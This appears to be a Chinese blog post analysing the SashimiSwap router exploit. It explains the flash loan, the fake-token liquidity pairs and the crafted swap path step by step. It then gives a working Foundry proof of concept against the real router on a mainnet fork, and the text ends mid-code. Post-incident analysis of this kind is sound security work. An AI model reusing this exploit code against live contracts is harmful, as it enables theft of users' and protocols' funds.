+<h2 id="3-攻击过程详细分析"><a href="#3-攻击过程详细分析" class="headerlink" title="3. 攻击过程详细分析"></a>3. 攻击过程详细分析</h2><h2 id="3-1-攻击准备阶段"><a href="#3-1-攻击准备阶段" class="headerlink" title="3.1 攻击准备阶段"></a>3.1 攻击准备阶段</h2><h3 id="3-1-1-闪电贷获取资金"><a href="#3-1-1-闪电贷获取资金" class="headerlink" title="3.1.1 闪电贷获取资金"></a>3.1.1 闪电贷获取资金</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 从DVM池借入大量WETH</span><br><span class="line">uint256 constant FLASH_LOAN_AMOUNT = 399639492413750733592 wei; // 约400 ETH</span><br><span class="line">dvm.flashLoan(0, FLASH_LOAN_AMOUNT, address(this), data);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>其中 150 WETH 用于换取 UNI ，此时这150WETH会进入 router 的余额</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">address[] memory path0 = new address[](2);</span><br><span class="line">        path0[0] = WETH;</span><br><span class="line">        path0[1] = UNI;</span><br><span class="line">        router.swapExactTokensForTokens(150 ether, 0, path0, address(this), block.timestamp);</span><br></pre></td></tr></table></figure></div>
+
+<p>router在transferOut时，如果自己余额不够会向vault提钱。但实际攻击时router与vault的流动性都不足以支付攻击者造成的资金缺口，所以攻击者自己通过一笔swap给router提供了150WETH，并通过攻击提了出来</p>
+<h3 id="3-1-2-部署假代币"><a href="#3-1-2-部署假代币" class="headerlink" title="3.1.2 部署假代币"></a>3.1.2 部署假代币</h3><p>攻击者部署了三个假代币合约：</p>
+<ul>
+<li><code>FakeToken1</code> (FK1)</li>
+<li><code>FakeToken2</code> (FK2)</li>
+<li><code>FakeToken3</code> (FK3)</li>
+</ul>
+<p>这些FakeToken有标准的ERC20功能，攻击者拥有无限供应量</p>
+<h2 id="3-2-流动性构建阶段"><a href="#3-2-流动性构建阶段" class="headerlink" title="3.2 流动性构建阶段"></a>3.2 流动性构建阶段</h2><h3 id="3-2-1-创建交易对"><a href="#3-2-1-创建交易对" class="headerlink" title="3.2.1 创建交易对"></a>3.2.1 创建交易对</h3><p>攻击者使用借来的WETH和假代币创建了多个交易对：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// WETH-FakeToken1对（大额流动性）</span><br><span class="line">router.addLiquidity(</span><br><span class="line">    WETH,</span><br><span class="line">    address(fakeToken1),</span><br><span class="line">    247.6 ether,  </span><br><span class="line">    247.6 ether, </span><br><span class="line">    0, 0, address(this), block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// WETH-FakeToken2对</span><br><span class="line">router.addLiquidity(</span><br><span class="line">    WETH, address(fakeToken2),</span><br><span class="line">    1 ether, 1 ether,</span><br><span class="line">    0, 0, address(this), block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// WETH-FakeToken3对</span><br><span class="line">router.addLiquidity(</span><br><span class="line">    WETH, address(fakeToken3),</span><br><span class="line">    1 ether, 1 ether,</span><br><span class="line">    0, 0, address(this), block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// FakeToken2-FakeToken3对</span><br><span class="line">router.addLiquidity(</span><br><span class="line">    address(fakeToken2), address(fakeToken3),</span><br><span class="line">    1 ether, 1 ether,</span><br><span class="line">    0, 0, address(this), block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-2-2-流动性配置"><a href="#3-2-2-流动性配置" class="headerlink" title="3.2.2 流动性配置"></a>3.2.2 流动性配置</h3><ul>
+<li><strong>WETH-FakeToken1对</strong>：投入大量流动性（247.6 ETH），确保第一步交换时WETH余额变化显著</li>
+<li><strong>其他交易对</strong>：投入少量流动性（1 ETH），控制后续交换的实际输出，将输入尽可能留在可控的池子内</li>
+</ul>
+<h3 id="3-3-漏洞利用阶段"><a href="#3-3-漏洞利用阶段" class="headerlink" title="3.3 漏洞利用阶段"></a>3.3 漏洞利用阶段</h3><h3 id="3-3-1-构造攻击路径"><a href="#3-3-1-构造攻击路径" class="headerlink" title="3.3.1 构造攻击路径"></a>3.3.1 构造攻击路径</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">address[] memory path = new address[](5);</span><br><span class="line">path[0] = address(fakeToken1);  </span><br><span class="line">path[1] = WETH;                 </span><br><span class="line">path[2] = address(fakeToken2);  </span><br><span class="line">path[3] = address(fakeToken3);  </span><br><span class="line">path[4] = WETH;                 </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-3-2-执行漏洞交易"><a href="#3-3-2-执行漏洞交易" class="headerlink" title="3.3.2 执行漏洞交易"></a>3.3.2 执行漏洞交易</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.swapExactTokensForETHSupportingFeeOnTransferTokens(</span><br><span class="line">    457 ether,        // 输入大量FakeToken1</span><br><span class="line">    0,                // 最小输出为0</span><br><span class="line">    path,             // 构造的交易路径</span><br><span class="line">    address(this),    // swap后的接收地址为router</span><br><span class="line">    block.timestamp   // 截止时间</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-3-3-Key-points"><a href="#3-3-3-Key-points" class="headerlink" title="3.3.3 Key points"></a>3.3.3 K<strong>ey points</strong></h3><ul>
+<li>大量WETH留在攻击者控制的池子里</li>
+<li>函数错使用第一个交易对的WETH变化来计算最终输出</li>
+<li>攻击者获得了router发来的超额ETH，并可以撤回几个池子的流动性收回WETH</li>
+</ul>
+<h2 id="3-4-利润提取阶段"><a href="#3-4-利润提取阶段" class="headerlink" title="3.4 利润提取阶段"></a>3.4 利润提取阶段</h2><h3 id="3-4-1-移除流动性"><a href="#3-4-1-移除流动性" class="headerlink" title="3.4.1 移除流动性"></a>3.4.1 移除流动性</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 移除WETH-FakeToken1流动性</span><br><span class="line">router.removeLiquidity(</span><br><span class="line">    WETH, address(fakeToken1),</span><br><span class="line">    liquidity1, 0, 0,</span><br><span class="line">    address(this), block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// 移除其他流动性...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-4-2-偿还闪电贷"><a href="#3-4-2-偿还闪电贷" class="headerlink" title="3.4.2 偿还闪电贷"></a>3.4.2 偿还闪电贷</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 偿还闪电贷本金</span><br><span class="line">weth.transfer(DVM_POOL, quoteAmount);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-4-3-提取利润"><a href="#3-4-3-提取利润" class="headerlink" title="3.4.3 提取利润"></a>3.4.3 提取利润</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 攻击合约将WETH转换为ETH并转给攻击者账户</span><br><span class="line">uint256 wethBalance = weth.balanceOf(address(this));</span><br><span class="line">if (wethBalance &gt; 0) &#123;</span><br><span class="line">    weth.withdraw(wethBalance);</span><br><span class="line">    payable(ATTACKER).transfer(address(this).balance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-1-POC"><a href="#4-1-POC" class="headerlink" title="4.1 POC"></a>4.1 POC</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FakeToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    string public symbol;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 0;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line">    </span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">    </span><br><span class="line">    constructor(string memory _name, string memory _symbol) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        symbol = _symbol;</span><br><span class="line">        // 给部署者铸造大量代币</span><br><span class="line">        _mint(msg.sender, type(uint256).max);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _mint(address to, uint256 amount) internal &#123;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(address(0), to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool) &#123;</span><br><span class="line">        if (msg.sender != address(this)) &#123;</span><br><span class="line">            require(allowance[from][msg.sender] &gt;= amount, &quot;Insufficient allowance&quot;);</span><br><span class="line">            allowance[from][msg.sender] -= amount;</span><br><span class="line">        &#125;</span><br><span class="line">        balanceOf[from] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SashimiSwapAttacker is Test &#123;</span><br><span class="line">    // 常量地址</span><br><span class="line">    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;</span><br><span class="line">    address constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;</span><br><span class="line">    address constant SASHIMI_ROUTER = 0xe4FE6a45f354E845F954CdDeE6084603CEDB9410;</span><br><span class="line">    address constant ATTACKER_EOA = 0xa8189407A37001260975b9dA61a81c3Bd9F55908;</span><br><span class="line">    address constant ATTACK_CONTRACT = 0x2cCc076d1de2d88209f491C679Fa5BDe870C384a;</span><br><span class="line"></span><br><span class="line">    // 合约变量</span><br><span class="line">    AttackContract public attackContract;</span><br><span class="line">    IUniswapV2Router02 public router;</span><br><span class="line">    IUniswapV2Factory public factory;</span><br><span class="line">    IWETH public weth;</span><br><span class="line">    IERC20 public uni;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 13905777);</span><br><span class="line">        </span><br><span class="line">        // 初始化合约实例</span><br><span class="line">        router = IUniswapV2Router02(SASHIMI_ROUTER);</span><br><span class="line">        factory = IUniswapV2Factory(router.factory());</span><br><span class="line">        weth = IWETH(WETH);</span><br><span class="line">        uni = IERC20(UNI);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        // 模拟攻击者EOA部署攻击合约</span><br><span class="line">        vm.startPrank(ATTACKER_EOA);</span><br><span class="line">        </span><br><span class="line">        attackContract = new AttackContract();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\nAttack contract deployed at:&quot;, address(attackContract));</span><br><span class="line">        console.log(&quot;Attack contract owner:&quot;, attackContract.owner());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        console.log(&quot;\n&quot;);</span><br><span class="line">        console.log(&quot;===============================&quot;);</span><br><span class="line">        console.log(&quot;    SASHIMI SWAP ATTACK &quot;);</span><br><span class="line">        console.log(&quot;===============================\n&quot;);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;=== Initial State ===&quot;);</span><br><span class="line">        console.log(&quot;Attack contract owner:&quot;, attackContract.owner());</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\n=== Executing Attack ===&quot;);</span><br><span class="line">        uint256 ownerBalanceBefore = attackContract.owner().balance;</span><br><span class="line">        console.log(&quot;Owner balance before attack:&quot;, ownerBalanceBefore);</span><br><span class="line">        vm.deal(address(attackContract), 400 ether);</span><br><span class="line">        console.log(&quot;Attack contract after Flashloan:&quot;, address(attackContract).balance);</span><br><span class="line"></span><br><span class="line">        attackContract.start();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\n=== Attack Results ===&quot;);</span><br><span class="line">        uint256 ownerBalanceAfter = attackContract.owner().balance;</span><br><span class="line">        console.log(&quot;Owner balance after attack:&quot;, ownerBalanceAfter);</span><br><span class="line">        console.log(&quot;ETH profit for owner:&quot;, ownerBalanceAfter - ownerBalanceBefore, &quot;ETH&quot;);</span><br><span class="line">        console.log(&quot;UNI profit in attack contract:&quot;, uni.balanceOf(address(attackContract)), &quot;UNI&quot;);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\n&quot;);</span><br><span class="line">        console.log(&quot;========================================&quot;);</span><br><span class="line">        console.log(&quot;         ATTACK COMPLETED&quot;);</span><br><span class="line">        console.log(&quot;========================================&quot;);</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 真实攻击合约</span><br><span class="line">contract AttackContract &#123;</span><br><span class="line">    // 常量地址</span><br><span class="line">    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;</span><br><span class="line">    address constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;</span><br><span class="line">    address constant SASHIMI_ROUTER = 0xe4FE6a45f354E845F954CdDeE6084603CEDB9410;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    address public owner;</span><br><span class="line">    FakeToken public fakeToken1;</span><br><span class="line">    FakeToken public fakeToken2;</span><br><span class="line">    FakeToken public fakeToken3;</span><br><span class="line">    IUniswapV2Router02 public router;</span><br><span class="line">    IUniswapV2Factory public factory;</span><br><span class="line">    IWETH public weth;</span><br><span class="line">    IERC20 public uni;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    uint256 constant LIQUIDITY_AMOUNT = 1 ether;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        console.log(&quot;owner:&quot;, owner);</span><br><span class="line">        // 初始化合约实例</span><br><span class="line">        router = IUniswapV2Router02(SASHIMI_ROUTER);</span><br><span class="line">        factory = IUniswapV2Factory(router.factory());</span><br><span class="line">        weth = IWETH(WETH);</span><br><span class="line">        uni = IERC20(UNI);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        // 部署假代币</span><br><span class="line">        fakeToken1 = new FakeToken(&quot;Fake Token 1&quot;, &quot;FK1&quot;);</span><br><span class="line">        fakeToken2 = new FakeToken(&quot;Fake Token 2&quot;, &quot;FK2&quot;);</span><br><span class="line">        fakeToken3 = new FakeToken(&quot;Fake Token 3&quot;, &quot;FK3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 启动攻击</span><br><span class="line">    function start() external &#123;</span><br><span class="line">        executeAttack();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function executeAttack() internal &#123;</span><br><span class="line">        console.log(&quot;\n=== Step 1: Initial Setup ===&quot;);</span><br><span class="line">        // 将ETH转换为WETH</span><br><span class="line">        weth.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        uint256 initialWETH = weth.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;Initial WETH balance after deposit:&quot;, initialWETH);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;\n=== Swap WETH for UNI ===&quot;);</span><br><span class="line">        // 首先approve WETH给router</span><br><span class="line">        weth.approve(SASHIMI_ROUTER, 150 ether);</span><br><span class="line">        </span><br><span class="line">        //将WETH兑换为UNI，把weth发给router</span><br><span class="line">        uint256 uniBalanceBefore = uni.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;UNI balance before swap:&quot;, uniBalanceBefore);</span><br><span class="line">        </span><br><span class="line">        address[] memory path1 = new address[](2);</span><br><span class="line">        path1[0] = WETH;</span><br><span class="line">        path1[1] = UNI;</span><br><span class="line">        router.swapExactTokensForTokens(150 ether, 0, path1, address(this), block.timestamp);</span><br><span class="line">        </span><br><span class="line">        uint256 uniBalanceAfter = uni.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;UNI balance after swap:&quot;, uniBalanceAfter);</span><br><span class="line">        console.log(&quot;UNI tokens received:&quot;, uniBalanceAfter - uniBalanceBefore);</span><br><span class="line">        console.log(&quot;WETH balance after UNI swap:&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">        // 批准Router使用WETH和假代币</span><br><span class="line">        weth.approve(SASHIMI_ROUTER, type(uint256).max);</span><br><span class="line">        fakeToken1.approve(SASHIMI_ROUTER, type(uint256).max);</span><br><span class="line">        fakeToken2.approve(SASHIMI_ROUTER, type(uint256).max);</span><br><span class="line">        fakeToken3.approve(SASHIMI_ROUTER, type(uint256).max);</span><br><span class="line">        console.log(&quot;Approved all tokens for SashimiSwap Router&quot;);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\n=== Step 2: Adding Liquidity to Create Trading Pairs ===&quot;);</span><br><span class="line">        </span><br><span class="line">        // 添加流动性，创建交易对</span><br><span class="line">        console.log(&quot;Adding liquidity for WETH-FakeToken1 pair (247.6 ETH each)...&quot;);</span><br><span class="line">        router.addLiquidity(</span><br><span class="line">            WETH,</span><br><span class="line">            address(fakeToken1),</span><br><span class="line">            247.6 ether,</span><br><span class="line">            247.6 ether,</span><br><span class="line">            0, 0,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Adding liquidity for WETH-FakeToken2 pair (1 ETH 